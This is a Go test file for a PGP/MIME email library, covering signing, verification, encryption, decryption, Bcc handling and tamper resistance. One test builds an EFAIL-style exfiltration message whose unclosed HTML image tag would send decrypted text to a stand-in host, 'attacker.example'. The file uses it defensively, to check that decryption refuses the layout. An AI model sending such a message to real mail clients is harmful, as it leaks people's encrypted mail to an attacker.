package pgp

/*
/*
MIT License

Copyright (c) 2026 Shane

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	email "github.com/Bugs5382/go-email"
	"github.com/Bugs5382/go-email/internal/mimeparse"
	"github.com/ProtonMail/go-crypto/openpgp/packet"
	openpgp "github.com/ProtonMail/go-crypto/openpgp/v2"
)

func TestKeyBasics(t *testing.T) {
	t.Parallel()

	k := testKey(t, "Alice", "Alice@Example.com")
	if fp := k.Fingerprint(); len(fp) != 40 || strings.ToUpper(fp) != fp {
		t.Errorf("Fingerprint = %q", fp)
	}
	if got := k.Emails(); !slices.Equal(got, []string{"alice@example.com"}) {
		t.Errorf("Emails = %v", got)
	}
	if !k.HasPrivate() {
		t.Error("generated key must be private")
	}
	pub := publicOnly(t, k)
	if pub.HasPrivate() || pub.Fingerprint() != k.Fingerprint() {
		t.Error("public copy wrong")
	}
	if s := fmt.Sprintf("%v %+v %s", k, k, k); strings.Contains(s, "PrivateKey") || !strings.Contains(s, k.Fingerprint()) {
		t.Errorf("formatting a key must show only the fingerprint: %s", s)
	}
}

func TestUnlockWipesPassphrase(t *testing.T) {
	t.Parallel()

	e, err := openpgp.NewEntity("Carol", "", "carol@example.com", edConfig)
	if err != nil {
		t.Fatal(err)
	}
	if err := e.EncryptPrivateKeys([]byte("hunter2"), nil); err != nil {
		t.Fatal(err)
	}
	k := &Key{e: e}
	if !k.Locked() {
		t.Fatal("key should be locked")
	}
	if _, err := NewSigner(k); !errors.Is(err, ErrKeyLocked) {
		t.Errorf("NewSigner on a locked key: err = %v", err)
	}
	wrong := []byte("wrong")
	if err := k.Unlock(wrong); err == nil {
		t.Error("wrong passphrase must fail")
	}
	pass := []byte("hunter2")
	if err := k.Unlock(pass); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(pass, make([]byte, len(pass))) || !bytes.Equal(wrong, make([]byte, len(wrong))) {
		t.Error("Unlock must wipe the passphrase slice")
	}
	if k.Locked() {
		t.Error("key should be unlocked")
	}
}

func TestReadKeysRejectsGarbage(t *testing.T) {
	t.Parallel()

	for _, in := range []string{"", "not a key", "-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nAAAA\n-----END PGP PUBLIC KEY BLOCK-----\n"} {
		if _, err := ReadArmoredKeys(strings.NewReader(in)); err == nil {
			t.Errorf("ReadArmoredKeys(%q) succeeded", in)
		}
	}
	if _, err := ReadKeys(strings.NewReader("\x99garbage")); err == nil {
		t.Error("ReadKeys(garbage) succeeded")
	}
}

func TestMemStoreAndChain(t *testing.T) {
	t.Parallel()

	bob := publicOnly(t, testKey(t, "Bob", "bob@example.com"))
	s := NewMemStore(bob, bob) // duplicates collapse
	for _, addr := range []string{"bob@example.com", "BOB@Example.COM", "Bob <bob@example.com>"} {
		got, err := s.Keys(context.Background(), addr)
		if err != nil || len(got) != 1 || got[0].Fingerprint() != bob.Fingerprint() {
			t.Errorf("Keys(%q) = %v, %v", addr, got, err)
		}
	}
	if got, _ := s.Keys(context.Background(), "nobody@example.com"); len(got) != 0 {
		t.Errorf("unknown address returned %v", got)
	}
	empty := NewMemStore()
	c := Chain(empty, s)
	if got, err := c.Keys(context.Background(), "bob@example.com"); err != nil || len(got) != 1 {
		t.Errorf("Chain = %v, %v", got, err)
	}
	boom := errors.New("boom")
	failing := KeyStoreFunc(func(context.Context, string) ([]*Key, error) { return nil, boom })
	if _, err := Chain(failing, s).Keys(context.Background(), "bob@example.com"); !errors.Is(err, boom) {
		t.Errorf("Chain must fail closed on a store error, got %v", err)
	}
}

func TestLoadDir(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	bob := testKey(t, "Bob", "bob@example.com")
	armored, err := bob.ArmoredPublic()
	if err != nil {
		t.Fatal(err)
	}
	var bin bytes.Buffer
	if err := testKey(t, "Dave", "dave@example.com").e.Serialize(&bin); err != nil {
		t.Fatal(err)
	}
	must := func(name string, b []byte) {
		if err := os.WriteFile(filepath.Join(dir, name), b, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	must("bob.asc", armored)
	must("dave.gpg", bin.Bytes())
	must("README.txt", []byte("ignored"))
	if err := os.Mkdir(filepath.Join(dir, "sub"), 0o700); err != nil {
		t.Fatal(err)
	}
	s, err := LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, addr := range []string{"bob@example.com", "dave@example.com"} {
		if got, _ := s.Keys(context.Background(), addr); len(got) != 1 || got[0].HasPrivate() {
			t.Errorf("LoadDir: Keys(%s) = %v", addr, got)
		}
	}
	must("bad.asc", []byte("-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nzz\n-----END PGP PUBLIC KEY BLOCK-----\n"))
	if _, err := LoadDir(dir); err == nil || !strings.Contains(err.Error(), "bad.asc") {
		t.Errorf("LoadDir must fail and name the bad file, got %v", err)
	}
}

func TestSignVerifyRoundTrip(t *testing.T) {
	t.Parallel()

	alice := testKey(t, "Alice", "alice@example.com")
	s, err := NewSigner(alice)
	if err != nil {
		t.Fatal(err)
	}
	var out sink
	m := testMessage()
	if err := email.New(transportFunc(out.send), email.WithMiddleware(email.Sign(s))).Send(context.Background(), m); err != nil {
		t.Fatal(err)
	}
	raw := render(t, out.msgs[0])
	if !bytes.Contains(raw, []byte(`Content-Type: multipart/signed; micalg=pgp-sha256; protocol="application/pgp-signature"`)) {
		t.Fatalf("not PGP/MIME signed:\n%s", raw)
	}
	res, err := Verify(context.Background(), raw, NewMemStore(publicOnly(t, alice)))
	if err != nil {
		t.Fatal(err)
	}
	if res.Signature != SignatureValid || res.Signer.Fingerprint() != alice.Fingerprint() || res.Encrypted {
		t.Errorf("result = %+v", res)
	}
	if !bytes.Contains(res.Entity, []byte("=46rom the desk of Alice")) {
		t.Error("signed entity must carry the QP-escaped From line")
	}

	// LF-only storage of the same message still verifies.
	lf := bytes.ReplaceAll(raw, []byte("\r\n"), []byte("\n"))
	if _, err := Verify(context.Background(), lf, NewMemStore(publicOnly(t, alice))); err != nil {
		t.Errorf("LF-normalised message: %v", err)
	}
}

func TestVerifyFailures(t *testing.T) {
	t.Parallel()

	alice := testKey(t, "Alice", "alice@example.com")
	mallory := testKey(t, "Mallory", "mallory@example.com")
	s, _ := NewSigner(alice)
	m := testMessage()
	c := m
	if err := s.Sign(context.Background(), &c); err != nil {
		t.Fatal(err)
	}
	raw := render(t, c)
	store := NewMemStore(publicOnly(t, alice))

	tampered := bytes.Replace(raw, []byte("numbers are in"), []byte("numbers are IN"), 1)
	if _, err := Verify(context.Background(), tampered, store); !errors.Is(err, ErrBadSignature) {
		t.Errorf("tampered: err = %v, want ErrBadSignature", err)
	}
	if _, err := Verify(context.Background(), raw, NewMemStore()); !errors.Is(err, ErrUnknownSigner) {
		t.Errorf("no sender key: err = %v, want ErrUnknownSigner", err)
	}
	// A valid signature by someone else's key is not a signature by From.
	if _, err := Verify(context.Background(), raw, NewMemStore(publicOnly(t, mallory))); !errors.Is(err, ErrUnknownSigner) {
		t.Errorf("wrong sender key: err = %v, want ErrUnknownSigner", err)
	}
	spoofed := bytes.Replace(raw, []byte("From: Alice <alice@example.com>"), []byte("From: Mallory <mallory@example.com>"), 1)
	if _, err := Verify(context.Background(), spoofed, NewMemStore(publicOnly(t, alice), publicOnly(t, mallory))); !errors.Is(err, ErrUnknownSigner) {
		t.Errorf("From rewritten to another sender: err = %v, want ErrUnknownSigner", err)
	}
	plain := render(t, m)
	if _, err := Verify(context.Background(), plain, store); !errors.Is(err, ErrNotSigned) {
		t.Errorf("unsigned: err = %v, want ErrNotSigned", err)
	}
	if _, err := Verify(context.Background(), raw, store, WithMaxSize(100)); !errors.Is(err, ErrTooLarge) {
		t.Errorf("size cap: err = %v, want ErrTooLarge", err)
	}
}

func TestSignerRejectsMismatchAndEncrypted(t *testing.T) {
	t.Parallel()

	s, _ := NewSigner(testKey(t, "Alice", "alice@example.com"))
	m := testMessage()
	m.From = "someone-else@example.com"
	if err := s.Sign(context.Background(), &m); !errors.Is(err, ErrSignerMismatch) {
		t.Errorf("From mismatch: err = %v", err)
	}
	m = testMessage()
	m.Body = &email.Part{ContentType: `multipart/encrypted; protocol="application/pgp-encrypted"; boundary=x`, Body: []byte("x")}
	if err := s.Sign(context.Background(), &m); !errors.Is(err, ErrAlreadyEncrypted) {
		t.Errorf("sign over encrypted: err = %v", err)
	}
	if _, err := NewSigner(publicOnly(t, testKey(t, "Alice", "alice@example.com"))); !errors.Is(err, ErrNoPrivateKey) {
		t.Errorf("public key signer: err = %v", err)
	}
}

func TestEncryptDecryptRoundTrip(t *testing.T) {
	t.Parallel()

	bob := testKey(t, "Bob", "bob@example.com")
	enc, err := NewEncryptor(NewMemStore(publicOnly(t, bob)))
	if err != nil {
		t.Fatal(err)
	}
	m := testMessage()
	c := m
	if err := enc.Encrypt(context.Background(), &c); err != nil {
		t.Fatal(err)
	}
	raw := render(t, c)
	if !bytes.Contains(raw, []byte(`multipart/encrypted; protocol="application/pgp-encrypted"`)) {
		t.Fatalf("not PGP/MIME encrypted:\n%s", raw)
	}
	if bytes.Contains(raw, []byte("numbers are in")) || bytes.Contains(raw, []byte("q3.csv")) {
		t.Fatal("plaintext body or attachment name leaked")
	}
	res, err := Decrypt(context.Background(), raw, bob, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !res.Encrypted || res.Signature != SignatureNone {
		t.Errorf("result = %+v", res)
	}
	inner, err := mimeparse.Parse(res.Entity)
	if err != nil {
		t.Fatal(err)
	}
	if mt, _, _ := inner.MediaType(); mt != "multipart/mixed" {
		t.Errorf("inner entity type = %q", mt)
	}
	if _, err := Decrypt(context.Background(), raw, testKey(t, "Eve", "eve@example.com"), nil); !errors.Is(err, ErrDecrypt) {
		t.Errorf("wrong key: err = %v, want ErrDecrypt", err)
	}
}

func TestSignEncryptRoundTrip(t *testing.T) {
	t.Parallel()

	alice := testKey(t, "Alice", "alice@example.com")
	bob := testKey(t, "Bob", "bob@example.com")
	mw, err := SignEncrypt(alice, NewMemStore(publicOnly(t, bob)), WithEncryptToSelf(publicOnly(t, alice)))
	if err != nil {
		t.Fatal(err)
	}
	var out sink
	if err := email.New(transportFunc(out.send), email.WithMiddleware(mw)).Send(context.Background(), testMessage()); err != nil {
		t.Fatal(err)
	}
	if len(out.msgs) != 1 {
		t.Fatalf("got %d messages", len(out.msgs))
	}
	raw := render(t, out.msgs[0])
	senders := NewMemStore(publicOnly(t, alice))
	for _, k := range []*Key{bob, alice} { // encrypt-to-self: both can read it
		res, err := Decrypt(context.Background(), raw, k, senders)
		if err != nil {
			t.Fatalf("decrypt as %s: %v", k.Emails()[0], err)
		}
		if res.Signature != SignatureValid || res.Signer.Fingerprint() != alice.Fingerprint() {
			t.Errorf("as %s: result = %+v", k.Emails()[0], res)
		}
	}
	res, err := Decrypt(context.Background(), raw, bob, NewMemStore())
	if err != nil || res.Signature != SignatureUnknownKey || res.Signer != nil {
		t.Errorf("unknown sender key: %+v, %v", res, err)
	}
}

// TestDecryptInnerSignedEntity covers RFC 3156 section 6.1: an encrypted
// multipart/signed entity, as some clients send it.
func TestDecryptInnerSignedEntity(t *testing.T) {
	t.Parallel()

	alice := testKey(t, "Alice", "alice@example.com")
	bob := testKey(t, "Bob", "bob@example.com")
	s, _ := NewSigner(alice)
	enc, _ := NewEncryptor(NewMemStore(publicOnly(t, bob)))
	m := testMessage()
	if err := s.Sign(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	if err := enc.Encrypt(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	res, err := Decrypt(context.Background(), render(t, m), bob, NewMemStore(publicOnly(t, alice)))
	if err != nil {
		t.Fatal(err)
	}
	if res.Signature != SignatureValid {
		t.Errorf("inner multipart/signed not verified: %+v", res)
	}
	if bytes.Contains(res.Entity, []byte("multipart/signed")) {
		t.Error("Entity must be the signed content, not the signed wrapper")
	}
}

// TestEncryptAEAD checks that a recipient key advertising SEIPDv2 gets
// AEAD-encrypted data, one without it gets SEIPDv1, and WithCipher is
// honoured.
func TestEncryptAEAD(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		key     *Key
		version byte
	}{
		{testKey(t, "Bob", "bob@example.com"), 1},
		{testAEADKey(t, "Bob", "bob@example.com"), 2},
	} {
		enc, err := NewEncryptor(NewMemStore(publicOnly(t, tc.key)), WithCipher(AES128))
		if err != nil {
			t.Fatal(err)
		}
		m := testMessage()
		if err := enc.Encrypt(context.Background(), &m); err != nil {
			t.Fatal(err)
		}
		raw := render(t, m)
		if v := seipdVersion(t, ciphertextOf(t, raw)); v != tc.version {
			t.Errorf("SEIPD version = %d, want %d", v, tc.version)
		}
		if _, err := Decrypt(context.Background(), raw, tc.key, nil); err != nil {
			t.Fatal(err)
		}
	}
}

// TestDecryptFailsClosedOnTamper flips ciphertext bytes (SEIPDv1 with MDC
// and SEIPDv2 AEAD) and checks that Decrypt returns no plaintext at all.
func TestDecryptFailsClosedOnTamper(t *testing.T) {
	t.Parallel()

	for _, bob := range []*Key{testKey(t, "Bob", "bob@example.com"), testAEADKey(t, "Bob", "bob@example.com")} {
		enc, _ := NewEncryptor(NewMemStore(publicOnly(t, bob)))
		m := testMessage()
		m.Text = strings.Repeat("secret line\n", 2000) // several AEAD chunks and packets
		if err := enc.Encrypt(context.Background(), &m); err != nil {
			t.Fatal(err)
		}
		ct := ciphertextOf(t, render(t, m))
		v := seipdVersion(t, ct)
		for _, off := range []int{len(ct) / 2, len(ct) - 5} {
			bad := slices.Clone(ct)
			bad[off] ^= 0x01
			raw := rebuildEncrypted(t, bad)
			res, err := Decrypt(context.Background(), raw, bob, nil)
			if err == nil || res != nil {
				t.Fatalf("seipd v%d off=%d: tampered ciphertext decrypted (res=%v)", v, off, res != nil)
			}
			if !errors.Is(err, ErrDecrypt) {
				t.Errorf("seipd v%d off=%d: err = %v, want ErrDecrypt", v, off, err)
			}
		}
		// Truncation must fail too, not return the prefix.
		raw := rebuildEncrypted(t, ct[:len(ct)*2/3])
		if res, err := Decrypt(context.Background(), raw, bob, nil); err == nil || res != nil {
			t.Errorf("seipd v%d: truncated ciphertext decrypted", v)
		}
	}
}

// TestDecryptRejectsNonIntegrityProtected builds a legacy Symmetrically
// Encrypted Data packet (tag 9, no MDC), the EFAIL CBC/CFB gadget vector.
func TestDecryptRejectsNonIntegrityProtected(t *testing.T) {
	t.Parallel()

	bob := testKey(t, "Bob", "bob@example.com")
	enc, _ := NewEncryptor(NewMemStore(publicOnly(t, bob)))
	m := testMessage()
	if err := enc.Encrypt(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	raw := rebuildEncrypted(t, downgradeToSED(t, ciphertextOf(t, render(t, m))))
	if res, err := Decrypt(context.Background(), raw, bob, nil); err == nil || res != nil || !errors.Is(err, ErrDecrypt) {
		t.Fatalf("non-integrity-protected message: res=%v err=%v", res != nil, err)
	}
}

// TestDecryptEFAILStructure checks the MIME-level mitigations: only a
// top-level multipart/encrypted is decrypted, and an encrypted part nested
// in attacker-controlled multipart/mixed (the direct-exfiltration layout) is
// refused.
func TestDecryptEFAILStructure(t *testing.T) {
	t.Parallel()

	bob := testKey(t, "Bob", "bob@example.com")
	enc, _ := NewEncryptor(NewMemStore(publicOnly(t, bob)))
	m := testMessage()
	if err := enc.Encrypt(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	encPart := m.Body.Bytes()
	boundary := "evil"
	wrapped := "From: attacker@example.com\r\nTo: bob@example.com\r\nMIME-Version: 1.0\r\n" +
		"Content-Type: multipart/mixed; boundary=" + boundary + "\r\n\r\n" +
		"--" + boundary + "\r\nContent-Type: text/html\r\n\r\n<img src=\"http://attacker.example/?\r\n" +
		"--" + boundary + "\r\n" + string(encPart) + "\r\n" +
		"--" + boundary + "\r\nContent-Type: text/html\r\n\r\n\">\r\n" +
		"--" + boundary + "--\r\n"
	if res, err := Decrypt(context.Background(), []byte(wrapped), bob, nil); !errors.Is(err, ErrNotEncrypted) || res != nil {
		t.Errorf("nested encrypted part: res=%v err=%v, want ErrNotEncrypted", res != nil, err)
	}

	raw := render(t, m)
	parts := splitTop(t, raw)
	if len(parts) != 2 {
		t.Fatalf("expected two parts, got %d", len(parts))
	}
	three := rebuildWithParts(t, raw, parts[0], parts[1], []byte("Content-Type: text/html\r\n\r\n<b>injected</b>"))
	if _, err := Decrypt(context.Background(), three, bob, nil); !errors.Is(err, ErrMalformed) {
		t.Errorf("three-part multipart/encrypted: err = %v, want ErrMalformed", err)
	}
	badVersion := rebuildWithParts(t, raw, []byte("Content-Type: application/pgp-encrypted\r\n\r\nVersion: 2\r\n"), parts[1])
	if _, err := Decrypt(context.Background(), badVersion, bob, nil); !errors.Is(err, ErrMalformed) {
		t.Errorf("Version: 2: err = %v, want ErrMalformed", err)
	}
}

func TestEncryptorMissingKeyAndBcc(t *testing.T) {
	t.Parallel()

	bob := publicOnly(t, testKey(t, "Bob", "bob@example.com"))
	store := NewMemStore(bob)
	enc, _ := NewEncryptor(store)
	m := testMessage()
	m.Cc = []string{"carol@example.com"}
	err := enc.Encrypt(context.Background(), &m)
	var mk *MissingKeyError
	if !errors.Is(err, ErrNoRecipientKey) || !errors.As(err, &mk) || !slices.Equal(mk.Addrs, []string{"carol@example.com"}) {
		t.Errorf("missing key: err = %v", err)
	}

	m = testMessage()
	m.Bcc = []string{"bob@example.com"}
	m.To = []string{"bob@example.com", "bob@example.com"}
	if err := enc.Encrypt(context.Background(), &m); !errors.Is(err, ErrBccNotSplit) {
		t.Errorf("Bcc with several recipients: err = %v", err)
	}
	allow, _ := NewEncryptor(store, WithBccPolicy(BccAllow))
	if err := allow.Encrypt(context.Background(), &m); err != nil {
		t.Errorf("BccAllow: %v", err)
	}

	plain, _ := NewEncryptor(NewMemStore(), WithMissingKey(MissingKeyPlaintext))
	m = testMessage()
	if err := plain.Encrypt(context.Background(), &m); err != nil || m.Body != nil {
		t.Errorf("MissingKeyPlaintext with no keys at all: err=%v body=%v", err, m.Body != nil)
	}
}

func TestSignEncryptSplitsBccAndPlaintextPolicy(t *testing.T) {
	t.Parallel()

	alice := testKey(t, "Alice", "alice@example.com")
	bob := testKey(t, "Bob", "bob@example.com")
	dave := testKey(t, "Dave", "dave@example.com")
	store := NewMemStore(publicOnly(t, bob), publicOnly(t, dave))

	mw, err := SignEncrypt(alice, store)
	if err != nil {
		t.Fatal(err)
	}
	var out sink
	m := testMessage()
	m.Bcc = []string{"dave@example.com"}
	if err := mw(out.send)(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	if len(out.msgs) != 2 {
		t.Fatalf("got %d copies, want 2", len(out.msgs))
	}
	if _, err := Decrypt(context.Background(), render(t, out.msgs[0]), dave, nil); !errors.Is(err, ErrDecrypt) {
		t.Errorf("To copy must not be readable by the Bcc recipient: %v", err)
	}
	if _, err := Decrypt(context.Background(), render(t, out.msgs[1]), bob, nil); !errors.Is(err, ErrDecrypt) {
		t.Errorf("Bcc copy must not be readable by the To recipient: %v", err)
	}
	if _, err := Decrypt(context.Background(), render(t, out.msgs[1]), dave, nil); err != nil {
		t.Errorf("Bcc copy unreadable by its recipient: %v", err)
	}
	if len(m.Bcc) != 1 || m.Body != nil {
		t.Error("SignEncrypt must not mutate the caller's message")
	}

	// Missing key, default policy: fail closed, nothing sent.
	out = sink{}
	m = testMessage()
	m.Cc = []string{"carol@example.com"}
	if err := mw(out.send)(context.Background(), &m); !errors.Is(err, ErrNoRecipientKey) || len(out.msgs) != 0 {
		t.Errorf("fail closed: err=%v sent=%d", err, len(out.msgs))
	}

	// Missing key, plaintext policy: encrypted copy for bob, signed plaintext for carol.
	mwPlain, _ := SignEncrypt(alice, store, WithMissingKey(MissingKeyPlaintext))
	out = sink{}
	if err := mwPlain(out.send)(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	if len(out.msgs) != 2 {
		t.Fatalf("got %d copies, want 2", len(out.msgs))
	}
	if got := out.msgs[0].Recipients(); !slices.Equal(got, []string{"bob@example.com"}) {
		t.Errorf("encrypted copy recipients = %v", got)
	}
	if got := out.msgs[1].Recipients(); !slices.Equal(got, []string{"carol@example.com"}) {
		t.Errorf("plaintext copy recipients = %v", got)
	}
	if _, err := Verify(context.Background(), render(t, out.msgs[1]), NewMemStore(publicOnly(t, alice))); err != nil {
		t.Errorf("plaintext copy must still be signed: %v", err)
	}

	// Encrypt-only (nil signing key).
	encOnly, err := SignEncrypt(nil, store)
	if err != nil {
		t.Fatal(err)
	}
	out = sink{}
	if err := encOnly(out.send)(context.Background(), new(testMessage())); err != nil {
		t.Fatal(err)
	}
	res, err := Decrypt(context.Background(), render(t, out.msgs[0]), bob, NewMemStore(publicOnly(t, alice)))
	if err != nil || res.Signature != SignatureNone {
		t.Errorf("encrypt-only: %+v, %v", res, err)
	}
}

func TestRetryOutsideSignEncrypt(t *testing.T) {
	t.Parallel()

	alice := testKey(t, "Alice", "alice@example.com")
	bob := testKey(t, "Bob", "bob@example.com")
	mw, _ := SignEncrypt(alice, NewMemStore(publicOnly(t, bob)))
	attempts := 0
	var last email.Message
	base := func(_ context.Context, m *email.Message) error {
		attempts++
		last = *m
		if attempts == 1 {
			return email.TransientError{Err: errors.New("try again")}
		}
		return nil
	}
	m := testMessage()
	send := email.Retry(2, time.Millisecond)(mw(base))
	if err := send(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	res, err := Decrypt(context.Background(), render(t, last), bob, NewMemStore(publicOnly(t, alice)))
	if err != nil || res.Signature != SignatureValid {
		t.Fatalf("second attempt: %+v %v", res, err)
	}
	if bytes.Contains(res.Entity, []byte("multipart/encrypted")) {
		t.Error("second attempt encrypted an already-encrypted body")
	}
}

func TestWeakAndUnsuitableKeysRejected(t *testing.T) {
	t.Parallel()

	weak, err := openpgp.NewEntity("Weak", "", "weak@example.com", &packet.Config{Algorithm: packet.PubKeyAlgoRSA, RSABits: 1024})
	if err != nil {
		t.Fatal(err)
	}
	enc, _ := NewEncryptor(NewMemStore(&Key{e: weak}))
	m := testMessage()
	m.To = []string{"weak@example.com"}
	if err := enc.Encrypt(context.Background(), &m); !errors.Is(err, ErrNoRecipientKey) {
		t.Errorf("RSA-1024 recipient: err = %v, want ErrNoRecipientKey", err)
	}
	if _, err := NewSigner(&Key{e: weak}); err == nil {
		t.Error("RSA-1024 signing key accepted")
	}

	// A key whose user ID is someone else's is never used for this address.
	bob := publicOnly(t, testKey(t, "Bob", "bob@example.com"))
	liar := KeyStoreFunc(func(context.Context, string) ([]*Key, error) { return []*Key{bob}, nil })
	enc, _ = NewEncryptor(liar)
	m = testMessage()
	m.To = []string{"carol@example.com"}
	if err := enc.Encrypt(context.Background(), &m); !errors.Is(err, ErrNoRecipientKey) {
		t.Errorf("mismatched user ID: err = %v, want ErrNoRecipientKey", err)
	}
}

func TestRSA2048RoundTrip(t *testing.T) {
	t.Parallel()

	e, err := openpgp.NewEntity("Rita", "", "rita@example.com", &packet.Config{Algorithm: packet.PubKeyAlgoRSA, RSABits: 2048})
	if err != nil {
		t.Fatal(err)
	}
	rita := &Key{e: e}
	mw, _ := SignEncrypt(rita, NewMemStore(publicOnly(t, rita)))
	var out sink
	m := testMessage()
	m.From, m.To = "rita@example.com", []string{"rita@example.com"}
	if err := mw(out.send)(context.Background(), &m); err != nil {
		t.Fatal(err)
	}
	res, err := Decrypt(context.Background(), render(t, out.msgs[0]), rita, NewMemStore(publicOnly(t, rita)))
	if err != nil || res.Signature != SignatureValid {
		t.Fatalf("%+v %v", res, err)
	}
}

func TestLoggingIsQuietAndContentFree(t *testing.T) {
	t.Parallel()

	var rec recordingLogger
	alice := testKey(t, "Alice", "alice@example.com")
	bob := testKey(t, "Bob", "bob@example.com")
	mw, _ := SignEncrypt(alice, NewMemStore(publicOnly(t, bob)), WithLogger(&rec))
	var out sink
	if err := mw(out.send)(context.Background(), new(testMessage())); err != nil {
		t.Fatal(err)
	}
	if _, err := Decrypt(context.Background(), render(t, out.msgs[0]), bob, NewMemStore(publicOnly(t, alice)), WithLogger(&rec)); err != nil {
		t.Fatal(err)
	}
	logs := rec.String()
	if logs == "" {
		t.Fatal("expected debug logs")
	}
	for _, secret := range []string{"numbers are in", "Quarterly", "alice@example.com", "bob@example.com", "PRIVATE KEY", "q3.csv"} {
		if strings.Contains(logs, secret) {
			t.Errorf("log output contains %q:\n%s", secret, logs)
		}
	}
	if !strings.Contains(logs, alice.Fingerprint()) {
		t.Error("logs should identify keys by fingerprint")
	}
}

type transportFunc func(ctx context.Context, m *email.Message) error

func (f transportFunc) Send(ctx context.Context, m email.Message) error { return f(ctx, &m) }
